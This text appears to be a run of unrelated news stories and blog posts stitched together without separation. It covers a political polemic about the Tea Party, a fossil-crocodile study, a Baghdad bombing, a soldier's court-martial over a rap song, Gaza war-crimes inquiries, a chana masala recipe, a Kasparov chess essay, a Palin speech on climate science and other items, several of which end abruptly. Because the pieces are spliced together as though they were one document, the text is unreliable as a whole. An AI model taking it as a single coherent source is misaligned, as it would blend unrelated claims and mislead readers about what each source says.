The press coverage of the Tea Party movement begins from a thoroughly false premise , that wide layers of the American population oppose the Obama administration from the right , outraged over “ socialism ” and “ big government ” and the sinister possibility of “ universal health care . ”
The Tea Party business took shape in a typically sordid and fraudulent manner .
One year ago , CNBC correspondent Rick Santelli let loose with a rant from the floor of the Chicago Board of Trade — cheered on by traders — against the Obama administration ’s meager mortgage reform , denouncing attempts “ to subsidize the losers ’ mortgages …
How many of you people want to pay for your neighbor ’s mortgage that has an extra bathroom and ca n’t pay their bills ? ”
Far from a spontaneous outburst , Santelli ’s appeal for a “ tea party ” protest was a stage - managed event , prepared well in advance and backed by wealthy , extreme right - wing forces .
In any case , how could such a reactionary and selfish attack on the millions in danger of losing their homes provide the basis for a “ populist ” revolt in any meaningful sense of the word ?
The various rallies organized by the Tea Party network have been attended by a combination of ultra- right activists and highly confused , primarily middle class layers .
Again , the gatherings have attracted forces largely through absurdly out - of - proportion media coverage .
This continues .
Last weekend ’s convention , addressed by former Alaska governor Sarah Palin , received front - page treatment in the leading US newspapers .
The New York Times referred to the movement ’s efforts to harness “ the grass - roots anger that burst onto the streets a year ago . ”
The Washington Post noted the number of convention delegates , but assured its readers that “ there are millions of Americans just like them . ”
This is a movement , declared the Post , “ that is unmistakably people - powered . ”
There are people and there are people .
The “ people ” who organized and spoke at the Tea Party convention happen to be well - heeled scoundrels and demagogues .
The speakers included Tom Tancredo , the former Colorado Republican congressman , a fundamentalist Christian and anti-immigrant fanatic ; Steve Milloy , the “ junk science ” commentator for FoxNews.com , i.e. , an opponent of any effort to reverse the damage inflicted on the environment by “ free enterprise ” ; Judge Roy Moore , the Alabama Supreme Court justice who refused to remove a monument of the Ten Commandments despite a federal judge ’s orders in 2003 and currently a Republican candidate for Alabama governor ; Fox News commentator Angela McGlowan , author of BAMBOOZLED : How Americans Are Being Exploited by the Lies of the Liberal Agenda ; etc. , etc .
A leader of the Memphis Tea Party , Mark Skoda , who presided over a final press conference , is a former UPS and FedEx executive and host of a radio program , “ For God and Country , ” on a Memphis radio station .
The audience , “ overwhelmingly white and middle - aged , ” according to the Post , was regaled with attacks on the Obama administration , including one effort to correlate the current administration and “ Marxist Dictators of Latin America , ” the defense of “ Judeo - Christian values , ” and appeals for fiscal responsibility , less government , lower taxes , states ’ rights and “ strong national security . ”
In her remarks to the meeting , Palin — reportedly paid $ 100,000 for her appearance — offered a simple - minded defense of American militarism and attacks on democratic rights .
She denounced law enforcement officials for supposedly granting “ our constitutional rights ” to terrorism suspects and the Obama administration for “ reaching out to hostile regimes , writing personal letters to dangerous dictators , and apologizing for America ! ”
In her appearances at the convention , she made clear her desire to be a candidate for the Republican presidential nomination in 2012 .
As a political figure , Palin is also largely a media and right - wing concoction .
Among her earliest sponsors and advisors were longtime Democratic Party fundraiser and Washington DC lawyer , John Coale , and his wife , Greta Van Susteren , the Fox News commentator .
Coale , a Scientologist like his spouse , raised large amounts of money for Sen. John Kerry in 2004 and for Hillary Clinton in 2008 .
When the latter lost the Democratic nomination to Barack Obama , Coale switched his allegiance to Sen .
John McCain and became especially involved in efforts to make Palin into a national figure .
This is the incestuous character of American politics .
The Tea Party movement has been organized by a section of the Republican Party , including Dick Armey , the former Texas congressman , House Majority leader and “ flat tax ” advocate , along with right - wing media types such as Rush Limbaugh , Sean Hannity and Glenn Beck .
Former House Speaker Newt Gingrich has endorsed the movement , and Texas Governor Rick Perry attended a rally in Austin , Texas .
Rupert Murdoch ’s Fox News has strenuously advertised and promoted the Tea Party events .
The reactionary policies advocated by this movement are not popular with the American people , and if the Tea Party forces were presented before the public in an accurate light , they would not garner significant support .
This is not , however , a reason for complacency .
The growth of extreme right - wing elements is a real danger .
But contrary to the claims of the Nation and the left - liberal milieu , the risk does not emerge from some mass base for fascistic politics in America .
It comes primarily from the continued subordination of the working class to the Democratic Party , and by that means , to the ruling elite .
This blocks the development of a progressive alternative and provides the Republican right with opportunities to make gains by demagogically exploiting the political impasse .
It is political roadblock that must be addressed .
A newfound horned crocodile may have been the largest predator encountered by our ancestors in Africa , researchers now suggest .
Scientists have even found bones from members of the human lineage bearing tooth marks from this reptile , whose scientific name , Crocodylus anthropophagus , means " man-eating crocodile . "
This predator , which lived some 1.84 million years ago , possessed a deep snout that would have made it look more robust than modern crocodiles .
It also had prominent triangular horns .
" They would have been visible mostly from the side as projections behind the eye , " said researcher Christopher Brochu , a vertebrate paleontologist at the University of Iowa .
" If you looked at them from the front , you would have seen ridges projecting upwards . "
A couple of living species of crocodile have similar horns , such as the Cuban and Siamese crocodiles .
" Males will use these in mating season to show off , " Brochu explained .
" While submerged they kind of tip their head forward , showing off the prominence of their horns to females . "
Scientists found a partial skull and skeleton of the crocodile at Olduvai Gorge in the Serengeti Plains of Tanzania in 2007 .
Past research there famously unearthed numerous fossils of extinct human species and their stone tools , strengthening the argument that our lineage originated in Africa .
Fossil leg and foot bones of at least two hominids from Olduvai bear crocodilian tooth marks , and came from roughly the same time as the newfound horned carnivore and within roughly 300 feet ( 100 meters ) from where the reptile 's skeleton was discovered .
" I can't guarantee these crocodiles were killing people , but they were certainly biting them , " Brochu said .
" Our ancestors would have had to be cautious close to the water , because the water 's edge at Olduvai Gorge would have been a very dangerous place . "
Crocodiles may have been common predators of hominids , the scientists noted .
Larger crocodiles would be capable of consuming our ancestors completely , leaving no trace .
" It was probably as large as a modern Nile crocodile , one of the largest living crocodilians at between 18 to 20 feet , " Brochu said .
" One thing to bear in mind was that while these crocodiles are not necessarily bigger than the ones today , hominids back then were smaller than we are today , so the crocodiles would have been relatively quite a bit larger . "
Crocodiles have a reputation for being living fossils that do not change over time , " and that 's just wrong , " Brochu added .
" If you go back five to 10 , 15 million years ago , there were more species of crocodile alive then than there are now , and the general assumption that once we entered the Quaternary period , the ice ages , crocodile diversity dropped .
This fossil existed during the Quaternary , so it indicated crocodile diversity remained somewhat higher than expected . "
Brochu and his colleagues detailed their findings online Feb. 23 in the journal PLoS ONE .
Women and children were among the pilgrims injured
At least 41 people have been killed and 106 injured by a female suicide bomber in north - east Baghdad , an interior ministry spokesman has said .
The woman detonated an explosives vest among a group of pilgrims making the journey to Karbala , 80 km from Baghdad .
A witness described seeing a fireball .
The Shia pilgrims were marking Arbaeen , the end of 40 days of mourning for the death of Prophet Muhammad 's grandson .
Troops and police are on alert during the pilgrimage .
The bomber had hidden the explosives under her abaya - a long , black over - garment , Maj Gen Qassim al - Moussawi told the Associated Press news agency .
The attack happened as pilgrims walked through Baghdad
Witness Raheem Kadhom said pilgrims were " crying for help " as they lay injured on the ground in the Shaab neighbourhood , AP reported .
Others helped by taking them to hospitals in cars rather than waiting for ambulances , Mr Kadhom said .
Security has also been increased around the revered Imam Hussein shrine in Karbala during the annual festival , which culminates on Friday .
Pre-election tension
In recent years the pilgrimage has been the target of similar attacks , blamed on Sunni extremists .
Twelve months ago , 32 pilgrims were killed by a female suicide bomber near Baghdad .
Monday 's attack comes amid heightened tension between Sunni and Shia groups ahead of parliamentary elections scheduled for March .
About 500 candidates have been barred from standing for office because of their alleged links to Saddam Hussein 's outlawed Baath Party .
Although the list does include candidates from both sides , Sunni political groups feel disproportionately targeted by the exclusions .
MARFA , Texas — Army Specialist and Iraq war veteran Marc Hall was incarcerated by the U.S. Army in Georgia for recording a song that expresses his anger over the Army ’s stop - loss policy .
Now he waits to be shipped to Iraq to face a court martial .
Stop - loss is a policy that allows the Army to keep soldiers active beyond the end of their signed contracts .
According to the Pentagon , more than 120,000 soldiers have been affected by stop - loss since 2001 , and currently 13,000 soldiers are serving under stop - loss orders , despite public pledges by President Barack Obama to phase out the policy .
Attorney David Gespass , a member of the National Lawyers Guild and founding member of the Military Law Task Force , has been consulting on the case and will possibly represent Hall .
" It ’s not clear to me if he ’ll be tried in Kuwait or Iraq , " Gespass told IPS .
" It may be a matter for the military judge to decide , once there is one . "
Gespass explained he believes the Army is handling the case this way for two reasons .
" One , it will make it much more difficult to defend because it ’s impossible to get witnesses over to a war zone , and two , it denies Hall ’s right to a public trial .
I think the fundamental reason is to make it more difficult for his supporters and witnesses to be there , " he said .
Gespass believes the Army ’s position " is that that ’s where all the alleged victims are [ Iraq ] , and they wanted to have the trial where their witnesses are going to be .
For me , it ’s a lot easier for the Army to get witnesses back to the states than it is for Marc to get his witnesses to a war zone . "
Hall , who is in the Army ’s 3rd Infantry Division , was placed in Liberty County Jail for the song , in which he angrily denounces the continuing policy that has barred him from exiting the military .
On Dec. 12 , Hall was thrown in jail by his command , on the pretext that the song he had written is considered a threat , and he is facing charges under Article 134 of the Uniform Code of Military Justice ( UCMJ ) , which covers communication threats .
" The charges are connected to song lyrics allegedly written by Spc. Hall that allege deadly threats against his chain of command and fellow Soldiers , specifically shooting them , " reads a statement released the by the Fort Stewart Public Affairs Office .
" I explained to [ my first sergeant ] that the hardcore rap song was a free expression of how people feel about the Army and its stop - loss policy , " explained Hall , in response to the charges .
" I explained that the song was neither a physical threat nor any threat whatsoever .
I told him it was just hip - hop . "
Military service members do not completely give up their rights to free speech , particularly not when they are doing so artistically while off duty , as was the case with Hall .
The military is claiming that he " communicated a threat " with his song .
Hall mailed a copy of the song to the Pentagon after the Army unilaterally extended his contract for a second Iraq deployment .
The Army ’s latest decision to deploy Hall to Kuwait is an unusual twist in a case that has already attracted widespread criticism from GI rights lawyers .
Once in Kuwait , Hall will be driven into Iraq to meet up with his is old unit , and placed in confinement and court martialed there .
Kevin Larson of the Fort Stewart Public Affairs
Office says the trial will be held in Iraq because that is where important witnesses are .
" It makes sense from the standpoint of witnesses .
Most of the witnesses are deployed , " he said .
Jim Klimanski , a civilian military lawyer and member of the National Lawyers Guild and the Military Law Task Force , told IPS that he feels the military is overreacting to the case , and that it is simply a matter of free speech and that the Army ’s actions violate Hall ’s First Amendment right to free speech .
" It ’s a political case , and the military should know that , " Klimanski explained .
" I think they are overreaching and overreacting because of Maj .
Hassan ( who went on a shooting spree at Fort Hood on Nov. 5 ) , and I can understand that to some degree , but cooler heads should prevail and they should deal with stop - loss , and maybe we ’ll get the case thrown out . "
IPS obtained a redacted copy of the Army ’s Charge Sheet against Hall , filed by Marcus Seiser , which includes five charges .
On the sheet , Hall is accused of telling someone he would " go on a rampage , " that " the song makes threats of acts of violence , " and that Hall is accused " of planning on shooting the brigade or battalion commanders . "
Jeff Paterson , the director of the soldier advocacy group Courage to Resist , which is assisting Hall , told IPS , " Marc ’s case is unique in that the military has n’t shown a propensity to go after these political speech cases for several years .
We think this is an important case because it could set precedent for free speech rights for those in the military . "
Klimanski , along with underscoring the importance of the case for the First Amendment , thinks the case highlights the military ’s ongoing use of stop - loss , which also contributes to how they have responded to Hall ’s song .
" It ’s a song , and he puts it out to the public , " Klimanski told IPS .
" We ’re not talking about a Major Hassan who is quietly plotting violence … this is political hyperbole .
This is his rant on stop - loss .
It ’s political speech . "
" He ’s over there saying I have no control over my life , " Klimanski added , " I could be in here forever .
We ’re talking about a war that could go on forever .
So poor old Marc Hall could possibility be in the military forever .
I see this as an issue of political speech .
The military may not like what they ’re hearing , but that ’s what it is .
There are people in the military saying their being in it is / was wrong , and they want out . "
" They are sending him to Iraq just to punish him , " Klimaski believes .
" Not that they need to do that to conduct a court martial .
They are trying to find any which way to inflict punishment on Marc . "
Hall ’s supporters also say that it is highly unlikely that his current military lawyer will be available to deploy at a moment ’s notice .
" He will get a new military lawyer who is probably very busy and wo n’t have time to build a proper defense , " said Klimaski , " They are trying to stack the deck .
It is illegal to ship him to Iraq or Kuwait , but who is going to contest it ?
You would have to go to Iraq to contest it .
They know that they are not going to have a civilian lawyer out there .
They are just trying to punish him without due process . "
At the time of this writing , Hall was awaiting his being shipped to the Middle East , which could happen any time .

Jerusalem ( CNN ) --
An international human rights organization on Sunday faulted Israel 's investigation into alleged war crimes last year in Gaza .
Israel has not demonstrated that it will conduct thorough and objective investigations , Human Rights Watch said in a statement .
" An independent investigation is crucial to understand why so many civilians died and to bring justice for the victims of unlawful attacks , " said Joe Stork , deputy Middle East director for the New York - based organization .
In September , the United Nations Human Rights Council released a report by noted South African jurist Richard Goldstone .
The report concluded that both sides committed war crimes during the conflict , which killed about 1,400 Palestinians and 13 Israelis .
But U.N. chief Ban Ki-moon said last week that the world body has not made a determination on whether both sides have done enough to investigate allegations they committed war crimes during the three - week conflict , which began at the end of December 2008 .
In a report , Ban outlines steps Israelis and Palestinians have taken to fulfill a U.N. demand for credible and transparent inquiries into civilian casualties .
However , he concludes , " As such , no determination can be made on the implementation of the resolution by the parties concerned . "
Israel handed Ban a response outlining the steps the nation has taken to investigate charges of wrongdoing by its military during the course of the offensive in Gaza , which was aimed at stopping militant rocket fire into Israel .
The Israeli military has " launched investigations into 150 separate incidents , including 36 criminal investigations opened thus far , " according to the report .
For its part , the Palestinian Authority said it had created a commission to look into various charges of abuses , but made clear that it did not view the potential wrongdoing on the Palestinian side as seriously as that allegedly committed by the Israeli military .
" There is absolutely no symmetry or proportionality between the occupying power and the occupied people " wrote Riyad Mansour , Palestinian ambassador to the United Nations .
In Gaza , the ruling Hamas movement released a summary of the steps taken to investigate wrongdoing , saying it had prevented militants from targeting civilians .
But the rights organization dismissed the conclusion as " factually wrong . "
Human Rights
Watch said it is still reviewing a full Hamas report .
" Hamas can spin the story and deny the evidence , but hundreds of rockets rained down on civilian areas in Israel where no military installations were located , " Stork said .
" Hamas leaders at the time indicated they were intending to harm civilians . "

" I think we do have 50 votes in the Senate for a public option and frankly I do n't know why the president has not put it in and I hope that we can inject it , " Sanders said on MSNBC .
" I think it 's a very important part of healthcare reform . "
It 's not clear if Sanders 's remarks will encourage leaders to take up the public option , but they will surely give hope to his liberal supporters who have put pressure on Congress to pass a public plan .
The White House and Democratic leaders on Tuesday threw cold water on the possibility of pushing the proposal through , saying that there is not enough support in Congress to do so .
“ We have seen , obviously , that though there are some that are supportive of this , there is n’t enough political support in a majority to get this through , ” White House Press Secretary Robert Gibbs said this week .

I 'm not saying Tebow 's negotiations with the Montreal Alouettes are evidence he will wash out of the draft , then head north to play football .
I 'm just saying the CFL pays better than the UFL .

Marc Trestman has been a QB coach for eight different NFL teams , so it 's no surprise that Tebow has been working with him in advance of the NFL draft .
But Trestman currently happens to be the head coach of the CFL's Montreal Alouettes .
As a consequence of their association , the Alouettes ' have added Tebow to their " confidential negotiation list , " meaning that should he ever join the CFL , they have an exclusive option on his rights .

Now , while this is standard operating procedure , it 's fun to speculate on Tebow 's future , and extra fun when that future involves flunking out of America altogether .
But when you look at it , Montreal would be a perfect fit for him .
First off , they 're French - Canadian ( read : Catholic ) so they 're all about that pro-life business ( Ed note : Not true .

Second , they 're reigning Grey Cup champions , and we all know Tebow 's at his best when put on an already - successful franchise that runs a shotgun formation against an inferior level of competition .

You know those historical reports ( hadith ) of Prophet Muhammad stating that mastering a certain verse or concept within the Qur’an , is akin to knowing all of your faith ?
Simply put , a surrender to God can be explained in a single concept within Revelation .
For me , that one concept is the Qur’anic view of the human soul .
It explains that the soul knows right from wrong .
The Qur’an continues , stating thatJust as the farmer toils away at the land to produce a good crop , providing sunshine , water , and good soil , so should we be farmers for our souls .
For the past couple years , that ’s the state of mind I ’ve been in ; putting that core principle into practice .
What better way to nourish my soul than by becoming the best househusband I can be ?
Of course , I ’ve made several mistakes along the way and those struggles pretty much threw my blogging out the window .
I ’ll write about all of that in the coming months , but for now , I ’ve broken up my househusbandly duties into five areas .. and I ’m excited to shift the content of hijabman.com to reflect these aspects of my life :
1. Raising our children .
WarriorPrincess is almost 7 years old now and as feisty as ever .
WarriorPrincess #2 is due in April .
And we have begun the process of adopting a WarriorPrince in the future .
2. Nourishing our bodies through diet and exercise .
We ’ve done away with most processed foods ( and the additives , ‘ natural flavorings ’ and crap that comes with it ) and cook good , wholesome food throughout the week .
MrsHM attends zumba classes regularly , and I ’ve been going to a fitness bootcamp 3 x a week for the past year .
Next week , I start training for my first sprint triathlon .
My biggest fear ?
Being a hairy pakistani dude .
WarriorPrincess wants to compete in a kids triathlon this summer .
3. Keeping an organized house .
I come from a disorganized family – I know the ‘ junk drawer ’ all too well .
Training myself to create a system that I can work with has been a huge struggle for me , but I ’m well on my way to banishing all the ‘ junk drawers ’ in my house .
4. Money management .
With one kid edging toward tween - dom , one kid about to be born , and a couple big purchases coming up ( more on that later ) , it ’s become more important to track all of our finances and make sure we ’re maximizing our savings .
5 . Time management .
While my official title is househusband , I do have a part - time work from home gig which makes my balancing act a bit more challenging .
That all being said , welcome back to the web site !
For all you loyal fans of the site , I ’ve decided to start a giveaway each month .
This month , I ’ll be giving away the book Love InshaAllah : The Secret Love Lives of American Muslim Women … ( MrsHM is one of the contributor ’s , remember ? )
All you need to do is 1 . share this post on Facebook ( Twitter , if you do n’t have a FB account ) using the FB button below and then 2 . comment here , telling me what you ’d like to see on hijabman.com .
On Tuesday Morning … UPDATE : On Wednesday afternoon , I ’ll pick someone randomly !
Oh , feel free to like the FB page as well .
Have a great weekend !

Garry Kasparov , cyborg
Back in 1997 , chess grandmaster Garry Kasparov played against the IBM supercomputer Deep Blue , and lost .
At the time it was widely regarded as a huge victory for artificial intelligence .
But as Kasparov points out — in a fantastic new essay about computer chess in the New York Review of Books — experts had long predicted that a computer would eventually beat a human at chess .
That ’s because chess software does n’t need to analyze the game the way a human does .
It just needs to do a “ brute force ” attack :
It calculates all the possible games several moves out , finds the one that ’s most advantageous to itself , and makes that play .
Human grandmasters do n’t work that way .
They do not necessarily “ see ” the game several moves out .
Indeed , they can’t — as Kasparov points out , chess is so complex that “ a player looking eight moves ahead [ faces ] as many possible games as there are stars in the galaxy . ”
Instead , people who are truly great at chess use the peculiarly human qualities of understanding , insight and intuition :
They study oodles of games , encode that knowledge deeply in their brains , and practice incessantly .
“ As for how many moves ahead a grandmaster sees , ” as Kasparov concludes , the real answer is : “ Just one , the best one . ”
We like to think that artificial intelligence is replicating human smarts , but in reality it does something quite different .
One does n’t learn much about human intelligence by examining the way computers play chess , just as one does n’t learn much about computer intelligence by examining the way humans play chess .
They are fundamentally dissimilar processes .
But this gave Kasparov a fascinating idea .
What if , instead of playing against one another , a computer and a human played together — as part of a team ?
If humans and computers think in very different ways , perhaps they ’d be complementary .
So in 1998 Kasparov put together an event called “ Advanced Chess ” , where humans played against one another , but each was allowed to also use a PC with the best available chess software .
The chess players would enter positions into the machine , see what the computer thought was a good move , and use this to inform their own human analysis of the board .
Cyborg chess !
The results ?
As Kasparov writes :
Lured by the substantial prize money , several groups of strong grandmasters working with several computers at the same time entered the competition .
At first , the results seemed predictable .
The teams of human plus machine dominated even the strongest computers .
The chess machine Hydra , which is a chess - specific supercomputer like Deep Blue , was no match for a strong human player using a relatively weak laptop .
Human strategic guidance combined with the tactical acuity of a computer was overwhelming .
The surprise came at the conclusion of the event .
The winner was revealed to be not a grandmaster with a state - of - the - art PC but a pair of amateur American chess players using three computers at the same time .
Their skill at manipulating and “ coaching ” their computers to look very deeply into positions effectively counteracted the superior chess understanding of their grandmaster opponents and the greater computational power of other participants .
Weak human + machine + better process was superior to a strong computer alone and , more remarkably , superior to a strong human + machine + inferior process .
This stuff really fascinates me , because so much of our everyday lives now transpire in precisely this fashion :
We work as cyborgs , using machine intelligence to augment our human smarts .
Google amplifies our ability to find information , or even to remember it ( I often use it to resolve “ tip of the tongue ” moments — i.e. to locate the name of a person or concept I know but ca n’t quite put my finger on ) .
Social - networking software gives us an ESP - level awareness of what ’s going on in the lives of people we care about .
Tools like
Mint help us spot invisible patterns in how we ’re spending , or blowing , our hard - earned cash .
None of these tools replace human intelligence , or even work the way that human intelligence works .
Indeed , they ’re often cognitively quite alien processes — which is precisely why they can be so unsettling to some people , and why we ’re still sort of figuring out how , and when , to use them .
The arguments that currently rage about the social impact of Facebook and Google are , in a sense , arguments about what sort of cyborgs we want — or do n’t want — to be .
What I love about Kasparov ’s algorithm — “ Weak human + machine + better process was superior to a strong computer alone and … superior to a strong human + machine + inferior process ” — is that it suggests serious rewards accrue to those who figure out the best way to use thought - enhancing software .
( Or rather , those who figure out a way that ’s best for them ; people always use tools in slightly different , idiosyncratic ways . )
The process matters as much as the software itself .
How often do you check it ?
When do you trust the help it ’s offering , and when do you ignore it ?

My latest snap of cravings for Indian food hit a couple weeks ago , and because I have n’t learned anything over my two stints in the East Village , we ordered in from a restaurant on 6th Street and received puddles of oily , listless and weakly spiced curries that we dragged our way through only to be rewarded with bellyaches .
Also , regret .
I have an archive of Indian recipes I make several times a year , that I crave like clockwork as soon as we hit a cold snap and never disappoint , a cabinet full of robust rust and mustard - colored powders and seeds and yet I let someone else put lackluster chana masala in our bellies .
I ’ve made a slew of chana masalas — a Northern Indian chickpea stew with tomatoes — but none have made their way to you because while they ’ve all been edible , with bowls licked clean as there are exactly no intersections of chickpeas and tomatoes that I wo n’t gobble down , I had yet to find The One .
Many were closer to a spiced tomato sauce with chickpeas in it ; few had the spice assault I was looking for and none had that thing , a sour note , you find in great Indian food but is more elusive to American home cooks with a curry habit .
And then on Saturday night , we finally hit the ball out of the park .
A Madhur Jaffrey recipe , with a little tweaking , was exactly what I kept hoping to find in the pot after cooking my way through onion , garlic , ginger , hot peppers and a very long list of spices but had yet to find : chickpeas in the center field , untimid flavor and a sour punch that both comforts you on a brittle 25 degree day but also wakes you from hibernation .
We served it , as always , with my favorite Indian - Spiced Potatoes and Cauliflower , some long - grained rice , wedges of toasted store - bought onion flatbread and oh , this too : I was digging in the fridge and came across the remaining Toasted Cumin Crème Fraîche from last month ’s Black Bean Soup and whisked it into some whole milk yogurt for a delicious raita - like compliment to the chickpeas .
We stayed in and hung out with Crazy Hairs .
We had beer and two guests .
If this is the new Saturday night routine , I could get used to it .
About buying spices :
If you ’re anything like I was a few years ago , you love Indian food but are intimidated by the long list of spices in the recipes that you might not have and the expense of picking them up .
Here ’s my suggestion : do it .
Buy them .
Invest .
If you like this food , you will be thrilled that you can cook quality Indian food at home as it strikes your fancy , often from items in your own pantry .
Although the spices are an initial investment , the price of the remaining ingredients in Indian recipes ( and especially the ones on this site ) to be among the most affordable , largely dried beans and lentils , onions and rice — these recipes are a great way to stay on budget .

Chana Masala
Adapted from a Madhur Jaffrey recipe , which was adapted over here because much to my frustration , I own two Madhur Jaffrey books and this is in neither
This is an intensely spiced bright orange chana masala with a sourish bite that reminded of us the best restaurant versions we ’ve tasted .
I ’m thrilled to finally have a good recipe for it at home .
The major changes I made were simplifying the addition of spices , adding more tomatoes and oh , the recipe calls for a tablespoon of amchoor powder , which I did not have .
I looked it up and learned that it was dried unripe mango powder ( which sounds so delicious to me , I ’m buying it next time I go to Kalustyan ’s , who also sells it online ) , which is clearly a sour flavor , so I upped the lemon juice i used instead .
The dish had a nice sour snap at the end , so I will presume this is a good swap .
1 tablespoon vegetable oil
2 medium onions , minced
1 clove garlic , minced
2 teaspoons grated fresh ginger
1 fresh , hot green chili pepper , minced
1 tablespoon ground coriander
2 teaspoons ground cumin
1/2 teaspoon ground cayenne pepper ( I used a quarter of this because my cayenne is extremely hot )
1 teaspoon ground turmeric
2 teaspoons cumin seeds , toasted and ground
1 tablespoon amchoor powder ( see note )
2 teaspoons paprika
1 teaspoon garam masala
2 cups tomatoes , chopped small or 1 15 - ounce can of whole tomatoes with their juices , chopped small
2/3 cup water
4 cups cooked chickpeas or 2 ( 15 - ounce ) cans chickpeas , drained and rinsed
1/2 teaspoon salt
1/2 lemon ( juiced ) ( see note ; I used a whole lemon to swap for the amchoor powder )
Heat oil in a large skillet .
Add onion , garlic , ginger and pepper and sauté over medium heat until browned , about 5 minutes .
Turn heat down to medium - low and add the coriander , cumin , cayenne , turmeric , cumin seeds , amchoor ( if using it ) , paprika and garam masala .
Cook onion mixture with spiced for a minute or two , then add the tomatoes and any accumulated juices , scraping up any bits that have stuck to the pan .
Add the water and chickpeas .
Simmer uncovered for 10 minutes , then stir in salt and lemon juice .
Eat up or put a lid on it and reheat it when needed .
Curries such as this reheat very well , later or or in the days that follow , should it last that long .

This comic idea had a round - about way of coming into existance .
The revelation of new 5th generation Pokemon ‘ Zoroark ’ got me thinking of ‘ Noah ’s Ark ’ .
That got the wheels turning on an idea where Noah had finished packing the animals into the ark when God reveals that he created another generation of animals Noah would have to cram in there .
I really liked this , but then I realized that the idea that Noah was in essence the first Pokemon Trainer was really the core joke and could be done in one panel , something I knew Ray would appreciate .
I think it turned out very nice and keeps our reputation of bringing new styles to the table alive and well !
A baby girl died following an alleged fight between doctors in a Brazilian hospital delivery room , reports say , prompting an investigation .
The doctors were removed by security staff after clashing over who should be responsible for the delivery in the city of Ivinhema , local media reported .
Another doctor was eventually able to help the 32 - year - old woman but her baby was born dead , the reports said .
An official said it was not clear if the fight played a role in the death .
The incident took place in Ivinhema in Mato Grosso do Sul state .
The two doctors have since been sacked , the Agencia Estado news agency reported , and an investigation is being carried out by police and medical authorities .
The pregnant woman , Gislaine de Matos Rodrigues , was said to have asked the doctor who had been responsible for her pre-natal care to look after her during the birth .
But just after medication was given to induce the birth , another doctor arrived and was reported to have insisted that as he was on duty he should be responsible for the procedure .
' Screaming ' Reports say the two men at first started to argue , and then to fight .
" It was a big fight .
They ended up rolling around on the floor and my wife was screaming for them to stop , " said the woman 's husband , Gilberto Melo Cabreira , quoted by the Folha de Sao Paulo newspaper .
He said security staff had to be called to remove the doctors .
One of the doctors confirmed to Globo TV that there was a fight in the delivery room , but blamed his colleague .
" I did n't get in a fight with him , he got into a fight with me , " said Dr Sinomar Ricardo .
The station said it was unable to interview the second doctor .
According to Brazilian media , another member of staff was eventually able to help in an emergency caesarean section 90 minutes later , but the baby girl was born dead .
A death certificate is said to attribute the cause to a lack of oxygen , but a full post - mortem examination has yet to be completed .

Former Alaska Gov. Sarah Palin called studies supporting global climate change a " bunch of snake oil science " Monday during a rare appearance in California , a state that has been at the forefront of environmental regulations .
Palin spoke before a logging conference in Redding , a town of 90,000 about 160 miles north of the state capital .
The media were barred from the event , but The Associated Press bought a $ 74 ticket to attend .
Palin said California 's heavy regulatory environment makes it difficult for businesses to succeed , a point that is shared by many business leaders in the state .
She criticized what she said were heavy - handed environmental laws .
As Alaska governor , for example , she said she sued the federal government to overturn the listing of polar bears as a threatened species .
As Alaska North Slope wells dry up , the state is examining offshore drilling for oil and natural gas reserves .
Protections for polar bears under the Endangered Species Act could thwart those explorations , according to Palin and her successor , Alaska Gov. Sean Parnell , who has picked up the cause .
Palin told the audience that filled the 2,000 - seat Redding Convention Center that she disagreed with the science the government used to support the listing .
" We knew the bottom line ... was ultimately to shut down a lot of our development , " she said during her 40 - minute speech , which was followed by a 20 - minute question - and - answer session .
" And it did n't make any sense because it was based on these global warming studies that now we 're seeing ( is ) a bunch of snake oil science . "
Palin urged the federal government to allow states to make such decisions for themselves .
Her comments were well - received by the audience members , many of whom brought copies of her book , " Going Rogue , " in hopes of getting Palin 's signature .
A second Palin speech in Redding scheduled for the evening was sold out .
The events were hosted by the Sierra - Cascade Logging Conference .
Palin made her appearance in a state that often has led the nation on environmental regulations , from restricting automobile pollution to greenhouse gas emissions .
The state 's Global Warming Solutions Act , which passed in 2006 and has been championed by Republican Gov. Arnold Schwarzenegger , requires greenhouse gas emissions statewide to be cut to 1990 levels by 2020 .
But that and other state environmental laws have come under increasing attack from Republican state lawmakers .
Palin also weighed in on the Obama administration 's efforts to secure a climate change treaty during the international conference held recently in Copenhagen .
" Yeah , I do n't think much of it , " Palin said .
Palin struck a sympathetic tone with the crowd , saying she shares the timber industry 's worries of cumbersome lawsuits by environmental groups .
" California is tough in this respect , " Palin said .
" Man , it is expensive to do business here and to get anything done ... I do think there 's hope though , because more Americans are becoming aware of the absurdity of such a situation .
Maybe California is just a little behind the times . "
Palin said she believes there 's a way to harvest timber without damaging the environment but has grown frustrated by environmental activists who want to " lock up the land . "
" We sought to protect the diversity of our forests and our wildlife while sustaining jobs and subsistence for residents of our state , " Palin said of her efforts as governor in trying to develop a vision statement for the Tongass National Forest in Alaska .
Conservation groups and the U.S. Forest Service have fought for decades over management of the country 's largest national forest .
She defended herself as a conservationist .
" We really do love our trees , " Palin said .
" I named my daughter Willow .
Is n't that granola enough for them ? "
“ Why ca n’t I walk down the street free of suggestion ? ”
That line from the Fugazi song “ Suggestion ” has always haunted me .
The song is not about advertising .
It ’s a song written from a woman ’s point of view as the subject of men ’s sexual desire .
However , I heard this song about the same time I saw the 1988 Rowdy Roddy Piper movie “ They Live ” , and I drew my own interpretation .
In “ They Live , ” an alien race had infiltrated society and was using subliminal messages to steer the actions and thinking of Americans in the 1980s .
When the protagonist , Piper , put on special sunglasses , he could not only see the aliens , but could also read the subliminal messages on everyday objects .
For example , billboards now said , “ Marry and have many children ” and money now said , “ Exalt your new god “ … or something like that .
It ’s been 20 years since I saw the film .
I live in California .
From day one of moving here 10 years ago , I ’ve noticed that this is the “ land of logos . ”
We are clogged with chain stores and their corporate - approved colors , while stickers on car windows push clothing companies .
I was painting a mural in a coffee shop in Oceanside , and a customer was exchanging pleasantries with me while I worked .
I mentioned that this coffee shop had the best coffee in San Diego , and she asked , “ Is it as good as Starbuck ’s ? ” as though Starbucks was the standard for good coffee .
This mentality likely comes from the belief that Starbucks is everywhere , so they must be good .
Since the “ market decides ” what is best , then Starbucks must be top shelf .
In my time working as a cook at Applebee ’s restaurant , I always wondered why on Earth customers continue going to a restaurant where soups come boil - in - a - bag and steaks are microwaved .
( Note : that is a true business secret of Applebee’s .
Steaks are grilled just long enough to leave lines on both sides and then thrown in the microwave . ) .
A co-worker told me that he believes familiarity draws in the crowds .
Applebee ’s is a nationwide chain .
When folks see this sub-par , “ crazy - crap - on - the - walls ” eatery , they are reminded of home , normalcy and welcoming , mediocre familiarity .
I live in a town with a Big - O Tires and Firestone Tires , as well as a dozen tire outlets all called simply “ Llantera ” ( Spanish for “ tire shop ” ) .
